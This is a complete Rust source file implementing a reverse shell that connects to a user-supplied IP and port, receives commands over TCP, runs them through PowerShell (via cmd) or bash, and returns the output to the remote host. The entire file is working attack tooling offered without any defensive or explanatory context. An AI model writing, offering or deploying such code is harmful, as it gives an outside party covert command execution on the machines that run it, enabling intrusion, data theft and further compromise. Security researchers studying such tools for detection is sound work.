use std::env;
use std::process::{Command, Stdio};
use std::net::TcpStream;
use std::io::{Read, Write};

fn main() {
    let args: Vec<String> = env::args().collect();

    if args.len() != 4 {
        eprintln!("Usage: {} <ip> <port> <type>", args[0]);
        eprintln!("Type: powershell | bash");
        return;
    }

    let ip = &args[1];
    let port = &args[2];
    let reverse_type = &args[3];

    match reverse_type.as_str() {
        "powershell" => run_powershell_shell(ip, port),
        "bash" => run_bash_shell(ip, port),
        _ => eprintln!("Invalid type. Use 'powershell', or 'bash'."),
    }
}

fn run_powershell_shell(ip: &str, port: &str) {
    println!("Launching PowerShell reverse shell to {}:{}", ip, port);

    if let Ok(mut stream) = TcpStream::connect(format!("{}:{}", ip, port)) {
        loop {
            let mut buffer = [0; 1024];
            match stream.read(&mut buffer) {
                Ok(size) if size > 0 => {
                    let command = String::from_utf8_lossy(&buffer[..size]);
                    let output = execute_powershell_command(command.trim());
                    let _ = stream.write(output.as_bytes());
                }
                _ => break,
            }
        }
    } else {
        eprintln!("Failed to connect to {}:{}", ip, port);
    }
}

fn run_bash_shell(ip: &str, port: &str) {
    println!("Launching Bash reverse shell to {}:{}", ip, port);

    if let Ok(mut stream) = TcpStream::connect(format!("{}:{}", ip, port)) {
        loop {
            let mut buffer = [0; 1024];
            match stream.read(&mut buffer) {
                Ok(size) if size > 0 => {
                    let command = String::from_utf8_lossy(&buffer[..size]);
                    let output = execute_bash_command(command.trim());
                    let _ = stream.write(output.as_bytes());
                }
                _ => break,
            }
        }
    } else {
        eprintln!("Failed to connect to {}:{}", ip, port);
    }
}

fn execute_powershell_command(command: &str) -> String {
    let cmd = format!("powershell -NoProfile -Command {}", command);
    match Command::new("cmd")
        .arg("/C")
        .arg(cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
    {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            format!("{}\n{}", stdout, stderr)
        }
        Err(e) => format!("Error executing PowerShell command: {}\n", e),
    }
}

fn execute_bash_command(command: &str) -> String {
    match Command::new("bash")
        .arg("-c")
        .arg(command)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
    {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            format!("{}\n{}", stdout, stderr)
        }
        Err(e) => format!("Error executing Bash command: {}\n", e),
    }
}
